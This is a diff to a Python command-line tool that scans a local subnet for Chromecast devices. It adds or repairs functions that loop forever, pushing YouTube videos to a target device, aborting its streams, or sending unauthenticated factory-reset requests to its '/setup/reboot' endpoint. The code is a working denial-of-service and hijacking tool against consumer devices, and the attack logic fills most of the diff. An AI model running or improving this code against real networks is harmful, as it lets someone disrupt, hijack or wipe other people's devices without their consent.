@@ -5,7 +5,6 @@ import socket
 from netifaces import ifaddresses, interfaces
 from sys import exit, argv
 from os import system, name
-from multiprocessing.pool import ThreadPool
 import asyncio
 from requests import post, delete, get
 from json import dumps
@@ -32,7 +31,7 @@ def get_ips(gui=False):
     return None
 
 
-def is_ccast(ip):
+def is_ccast(ip, timeout=0.1):
     """ to check without async, if ip is legit chrome cast device """
     global ports
     results = []
@@ -42,7 +41,7 @@ def is_ccast(ip):
             for i in get_ips():  # getting the network card ip to connect with
                 if '.'.join(ip.split('.')[0:-1]) in i:
                     connected_ip = i
-            socket.setdefaulttimeout(0.01)
+            socket.setdefaulttimeout(timeout)
             socket_obj.bind((connected_ip, 0))
             result = socket_obj.connect_ex((ip, port))
             results.append(result)
@@ -52,8 +51,9 @@ def is_ccast(ip):
     return True if 0 in results else False
 
 
-@asyncio.coroutine  # old style since using py3.4
-def det_ccast(ip, log=False):
+@asyncio.coroutine
+# old style since using py3.4 to insure compatibility between CC-gui CC-cli
+def det_ccast(ip, log=False, timeout=0.05):
     """
     to detect chrome cast with its known ports and return its ip
     and status in list, asyncrnioudfdslfr-sly.
@@ -65,7 +65,7 @@ def det_ccast(ip, log=False):
         for i in get_ips():  # getting the network card ip to connect with
             if '.'.join(ip.split('.')[0:-1]) in i:  # cutting of the last digit
                 connected_ip = i
-        socket.setdefaulttimeout(0.01)
+        socket.setdefaulttimeout(timeout)
         try:
             socket_obj.bind((connected_ip, 0))
             result = socket_obj.connect_ex((ip, port))
@@ -84,6 +84,10 @@ def det_ccast(ip, log=False):
         click.echo()
         click.echo(
             click.style(
+                ' == ' + ip,
+                blink=False, bg='red', fg='black'))
+        click.echo(
+            click.style(
                 ('[' + '=' * int(counter / 10)) + ']',
                 blink=False, bg='red', fg='black'))
         click.clear()
@@ -91,16 +95,17 @@ def det_ccast(ip, log=False):
     return [True, ip] if 0 in results else [False, ip]
 
 
-def loop_ips(ip, log=False):
+def loop_ips(ip, log=False, timeout=0.05):
     """ looping through the ips from ch_ip till 255 and detect using
     det_ccast and returning a list of potential chromecasts """
     active_ccasts = []  # detected chrome casts stored here
     loop = asyncio.get_event_loop()
     tasks = [det_ccast(  # fetching the range of ips to async function
-        '.'.join(ip.split('.')[0:-1]) + str(i),
-        log) for i in range(1, 256)]
+        '.'.join(ip.split('.')[0:-1]) + '.' + str(i),
+        log, timeout) for i in range(1, 256)]
     results = loop.run_until_complete(asyncio.gather(asyncio.wait(tasks)))
     #  loop.close() should be stopped in the before exist
+    #  FIXME: register loop.close() to before exit
     for result in results[0][0]:  # looking for successful ones
         global counter
         counter = 0  # clearing up the global counter
@@ -115,7 +120,7 @@ def reset_cc(ip):
     for port in ports:
         try:
             post(
-                "http://" + ip + ":" + port + "/setup/reboot",
+                "http://" + ip + ":" + str(port) + "/setup/reboot",
                 data=dumps({"params": "fdr"}),
                 headers={'Content-type': 'application/json'})
             return True
@@ -130,7 +135,7 @@ def cancel_app(ip):
     for port in ports:
         try:
             delete(
-                "http://" + ip + ":" + port + "/apps/YouTube",
+                "http://" + ip + ":" + str(port) + "/apps/YouTube",
                 headers={'Content-type': 'application/json'})
             return True
         except:
@@ -143,7 +148,7 @@ def send_app(ip, video_link="v=04F4xlWSFh0&t=9"):
     global ports
     for port in ports:
         try:
-            post("http://" + ip + ":" + port + "/apps/YouTube",
+            post("http://" + ip + ":" + str(port) + "/apps/YouTube",
                  data=video_link,
                  headers={'Content-type': 'application/json'})
             return True
@@ -153,36 +158,86 @@ def send_app(ip, video_link="v=04F4xlWSFh0&t=9"):
 
 
 def cast(ip='192.168.0.188', video=False, duration=1,
-         log=False, add_log=None, counter=1):
+         log=False, counter=1):
     """ recurrence casting a video to inserted ip forever """
     if duration <= 0:
         raise AttributeError("Error: too small of a duration, greater than 0")
-    system('clear')  # FIXME: use click.clear() instead
-    if det_ccast(ip)[0]:
+    click.clear() if log else None
+    if is_ccast(ip):
         send_app(ip, video) if video else send_app(ip)
-        if (log):
-            print(add_log)
-            print("- Found and streamed to -")
+        if log:
+            click.echo(
+                click.style(
+                    'Success: streamed to ' + ip,
+                    bold=True, fg='blue'))
+            click.echo()
+    else:
+        raise AttributeError("Error: requires an active chrome cast IP")
     if log:
-        print("Number of streams done : " + str(counter))
-        print("#" * 5, " Ctrl-c to exit .. ")
+        click.echo(
+            click.style(
+                "[" + "Number of streams done : " + str(counter) + "]",
+                blink=False, bg='red', fg='black'))
+        click.echo("\n")
+        click.echo(click.style("< # > Ctrl-c to exit",
+                               fg='green'))
+        click.clear()
     sleep(duration)
-    return cast(ip, video, duration, log, add_log, counter + 1)
+    return cast(ip, video, duration, log, counter + 1)
+
+
+def block(ip='192.168.0.188', duration=1, log=False, counter=1):
+    """ recurrence stream abort inserted ip forever """
+    if duration <= 0:
+        raise AttributeError("Error: too small of a duration, greater than 0")
+    click.clear() if log else None
+    if is_ccast(ip):
+        cancel_app(ip)
+        if log:
+            click.echo(
+                click.style(
+                    'Success: stream aborted on ' + ip,
+                    bold=True, fg='blue'))
+            click.echo()
+    else:
+        raise AttributeError("Error: requires an active chrome cast IP")
+    if log:
+        click.echo(
+            click.style(
+                "[" + "Number of stream aborts : " + str(counter) + "]",
+                blink=False, bg='red', fg='black'))
+        click.echo("\n")
+        click.echo(click.style("< # > Ctrl-c to exit",
+                               fg='green'))
+        click.clear()
+    sleep(duration)
+    return block(ip, duration, log, counter + 1)
 
 
 def shut(ip='192.168.0.188', duration=1,
-         log=False, add_log=None, counter=1):
+         log=False, counter=1):
     """ recurrence factory reseting inserted ip forever """
     if duration <= 0:
         raise AttributeError("Error: too small of a duration, greater than 0")
-    system('clear')  # FIXME: use click.clear() instead
-    if det_ccast(ip)[0]:
-        reset_cc(ip) if video else send_app(ip)
-        if (log):
-            print(add_log)
-            print("- Found and factory reseted -")
+    click.clear() if log else None
+    if is_ccast(ip):
+        reset_cc(ip)
+        if log:
+            click.echo(
+                click.style(
+                    'Success: factory reset to ' + ip,
+                    bold=True, fg='blue'))
+            click.echo()
+    else:
+        raise AttributeError("Error: requires an active chrome cast IP")
     if log:
-        print("Number of factory resets done : " + str(counter))
-        print("#" * 5, " Ctrl-c to exit .. ")
+        click.echo(
+            click.style(
+                "[" + "Number of factory resets done : " + str(counter) + "]",
+                blink=False, bg='red', fg='black'))
+        click.echo("\n")
+        click.echo(click.style("< # > Ctrl-c to exit",
+                               fg='green'))
+        click.clear()
     sleep(duration)
-    return cast(ip, duration, log, add_log, counter + 1)
+    return shut(ip, duration, log, counter + 1)
